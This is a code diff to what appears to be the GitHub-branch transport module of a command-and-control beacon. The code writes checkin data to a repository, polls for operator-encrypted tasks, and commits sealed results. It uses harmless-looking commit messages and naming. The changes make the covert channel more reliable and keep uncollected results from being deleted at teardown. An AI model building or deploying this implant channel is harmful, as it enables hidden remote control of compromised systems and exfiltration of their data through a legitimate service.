@@ -20,18 +20,29 @@
 import { BaseTentacle } from "./BaseTentacle.ts";
 import {
   decryptBox, sealBox,
-  bytesToBase64, base64ToBytes,
+  base64ToBytes,
 } from "../crypto/sodium.ts";
-import type { CheckinPayload, Task, TaskResult } from "../types.ts";
+import type {
+  CheckinPayload,
+  Task,
+  TaskResult,
+  ResultSubmissionOutcome,
+} from "../types.ts";
 
 const OPERATOR_PUBKEY_VAR = "MONITORING_PUBKEY";
+const REF_UPDATE_ATTEMPTS = 3;
+
+function isRefConflict(error: unknown): boolean {
+  const status = (error as { status?: number } | null)?.status;
+  return status === 409 || status === 422;
+}
 
 export class BranchTentacle extends BaseTentacle {
   readonly kind = "branch" as const;
 
-  private ackSent = false;
   private lastTaskSha: string | null = null;
   private operatorPublicKey: Uint8Array | null = null;
+  private defaultBranch: string | null = null;
 
   // ── Identity helpers ──────────────────────────────────────────────────────────
 
@@ -47,16 +58,29 @@ export class BranchTentacle extends BaseTentacle {
 
   override async isAvailable(): Promise<boolean> {
     try {
-      await this.octokit.rest.git.getRef({
-        owner: this.config.repo.owner,
-        repo:  this.config.repo.name,
-        ref:   this.branchRefShort,
-      });
+      await this.getDefaultBranchHeadSha();
       return true;
-    } catch (err: any) {
-      if (err?.status === 404) return false;
+    } catch {
       return false;
     }
+  }
+
+  private async getDefaultBranchHeadSha(): Promise<string> {
+    const { owner, name: repo } = this.config.repo;
+    if (!this.defaultBranch) {
+      const repository = await this.octokit.rest.repos.get({ owner, repo });
+      const branch = repository.data.default_branch?.trim();
+      if (!branch) {
+        throw new Error("BranchTentacle: repository has no default branch");
+      }
+      this.defaultBranch = branch;
+    }
+    const ref = await this.octokit.rest.git.getRef({
+      owner,
+      repo,
+      ref: `heads/${this.defaultBranch}`,
+    });
+    return ref.data.object.sha;
   }
 
   // ── Operator key resolution ───────────────────────────────────────────────────
@@ -97,10 +121,7 @@ export class BranchTentacle extends BaseTentacle {
   private async writeFile(path: string, content: string, message: string): Promise<void> {
     const { owner, name: repo } = this.config.repo;
 
-    // 1. Get current branch HEAD sha
-    let headSha = await this.getBranchSha();
-
-    // 2. Create blob
+    // The blob is immutable and can be reused across optimistic ref retries.
     const blobResp = await this.octokit.rest.git.createBlob({
       owner, repo,
       content,
@@ -108,50 +129,56 @@ export class BranchTentacle extends BaseTentacle {
     });
     const blobSha = blobResp.data.sha;
 
-    // 3. Build tree
-    let treeSha: string | undefined;
-    if (headSha) {
-      // Get the current commit to get its tree SHA
-      const commitResp = await this.octokit.rest.git.getCommit({
-        owner, repo, commit_sha: headSha,
+    for (let attempt = 1; attempt <= REF_UPDATE_ATTEMPTS; attempt++) {
+      const headSha = await this.getBranchSha();
+      const baseCommitSha = headSha ?? await this.getDefaultBranchHeadSha();
+      const baseCommit = await this.octokit.rest.git.getCommit({
+        owner,
+        repo,
+        commit_sha: baseCommitSha,
       });
-      treeSha = commitResp.data.tree.sha;
-    }
 
-    const treeResp = await this.octokit.rest.git.createTree({
-      owner, repo,
-      ...(treeSha ? { base_tree: treeSha } : {}),
-      tree: [{
-        path,
-        mode: "100644",
-        type: "blob",
-        sha:  blobSha,
-      }],
-    });
-
-    // 4. Create commit
-    const commitResp = await this.octokit.rest.git.createCommit({
-      owner, repo,
-      message,
-      tree: treeResp.data.sha,
-      ...(headSha ? { parents: [headSha] } : { parents: [] }),
-    });
-    const newCommitSha = commitResp.data.sha;
-
-    // 5. Update or create the branch ref
-    if (headSha) {
-      await this.octokit.rest.git.updateRef({
+      const treeResp = await this.octokit.rest.git.createTree({
         owner, repo,
-        ref:   this.branchRefShort,
-        sha:   newCommitSha,
-        force: true,
+        base_tree: baseCommit.data.tree.sha,
+        tree: [{
+          path,
+          mode: "100644",
+          type: "blob",
+          sha:  blobSha,
+        }],
       });
-    } else {
-      await this.octokit.rest.git.createRef({
+      const commitResp = await this.octokit.rest.git.createCommit({
         owner, repo,
-        ref: this.branchRef,
-        sha: newCommitSha,
+        message,
+        tree: treeResp.data.sha,
+        parents: [baseCommitSha],
       });
+
+      try {
+        if (headSha) {
+          await this.octokit.rest.git.updateRef({
+            owner, repo,
+            ref:   this.branchRefShort,
+            sha:   commitResp.data.sha,
+            force: false,
+          });
+        } else {
+          await this.octokit.rest.git.createRef({
+            owner, repo,
+            ref: this.branchRef,
+            sha: commitResp.data.sha,
+          });
+        }
+        return;
+      } catch (error) {
+        if (
+          attempt === REF_UPDATE_ATTEMPTS ||
+          !isRefConflict(error)
+        ) {
+          throw error;
+        }
+      }
     }
   }
 
@@ -180,58 +207,60 @@ export class BranchTentacle extends BaseTentacle {
   private async deleteFile(path: string): Promise<void> {
     const { owner, name: repo } = this.config.repo;
 
-    // Get current HEAD and tree
-    const headSha = await this.getBranchSha();
-    if (!headSha) return;
+    for (let attempt = 1; attempt <= REF_UPDATE_ATTEMPTS; attempt++) {
+      const headSha = await this.getBranchSha();
+      if (!headSha) return;
 
-    const commitResp = await this.octokit.rest.git.getCommit({
-      owner, repo, commit_sha: headSha,
-    });
-    const baseTreeSha = commitResp.data.tree.sha;
+      const commitResp = await this.octokit.rest.git.getCommit({
+        owner, repo, commit_sha: headSha,
+      });
+      const treeResp = await this.octokit.rest.git.createTree({
+        owner, repo,
+        base_tree: commitResp.data.tree.sha,
+        tree: [{
+          path,
+          mode: "100644",
+          type: "blob",
+          sha:  null,
+        }] as any,
+      });
+      const newCommit = await this.octokit.rest.git.createCommit({
+        owner, repo,
+        message: "sync",
+        tree:    treeResp.data.sha,
+        parents: [headSha],
+      });
 
-    // Create a new tree that removes the file (sha: null deletes it)
-    const treeResp = await this.octokit.rest.git.createTree({
-      owner, repo,
-      base_tree: baseTreeSha,
-      tree: [{
-        path,
-        mode: "100644",
-        type: "blob",
-        sha:  null,
-      }] as any,
-    });
-
-    // Create commit
-    const newCommit = await this.octokit.rest.git.createCommit({
-      owner, repo,
-      message: "sync",
-      tree:    treeResp.data.sha,
-      parents: [headSha],
-    });
-
-    // Update ref
-    await this.octokit.rest.git.updateRef({
-      owner, repo,
-      ref:   this.branchRefShort,
-      sha:   newCommit.data.sha,
-      force: true,
-    });
+      try {
+        await this.octokit.rest.git.updateRef({
+          owner, repo,
+          ref:   this.branchRefShort,
+          sha:   newCommit.data.sha,
+          force: false,
+        });
+        return;
+      } catch (error) {
+        if (
+          attempt === REF_UPDATE_ATTEMPTS ||
+          !isRefConflict(error)
+        ) {
+          throw error;
+        }
+      }
+    }
   }
 
   // ── Checkin ──────────────────────────────────────────────────────────────────
 
   async checkin(payload: CheckinPayload): Promise<Task[]> {
-    const operatorPubKey = await this.getOperatorPublicKey();
-
-    // 1. On first checkin: create branch and write ack.json
-    if (!this.ackSent) {
-      const ackContent = JSON.stringify({
-        ts:     payload.checkinAt,
-        pubkey: await bytesToBase64(this.config.beaconKeyPair.publicKey),
-      });
-      await this.writeFile("ack.json", ackContent, "update");
-      this.ackSent = true;
+    if (!payload.identity) {
+      throw new Error("BranchTentacle: signed checkin identity is required");
     }
+
+    // 1. Refresh ack.json before every task poll.
+    await this.writeFile("ack.json", JSON.stringify(payload), "update");
+
+    const operatorPubKey = await this.getOperatorPublicKey();
 
     // 2. Poll for task.json
     let taskContent: string | null;
@@ -276,23 +305,27 @@ export class BranchTentacle extends BaseTentacle {
 
   // ── Submit result ────────────────────────────────────────────────────────────
 
-  async submitResult(result: TaskResult): Promise<void> {
+  async submitResult(result: TaskResult): Promise<ResultSubmissionOutcome> {
     const operatorPubKey = await this.getOperatorPublicKey();
 
     const sealed = await sealBox(JSON.stringify(result), operatorPubKey);
     const taskId8 = result.taskId.slice(0, 8);
     await this.writeFile(`result-${taskId8}.json`, sealed, "update");
+    return {
+      artifactWritten: true,
+      controllerAccepted: false,
+      channel: "branch",
+      acceptance: null,
+    };
   }
 
   // ── Teardown ─────────────────────────────────────────────────────────────────
 
   override async teardown(): Promise<void> {
-    try {
-      await this.octokit.rest.git.deleteRef({
-        owner: this.config.repo.owner,
-        repo:  this.config.repo.name,
-        ref:   this.branchRefShort,
-      });
-    } catch { /* best-effort */ }
+    // Normal lifecycle teardown must not delete the per-beacon branch: it may
+    // still contain result artifacts that the server has not polled yet.
+    this.lastTaskSha = null;
+    this.operatorPublicKey = null;
+    this.defaultBranch = null;
   }
 }
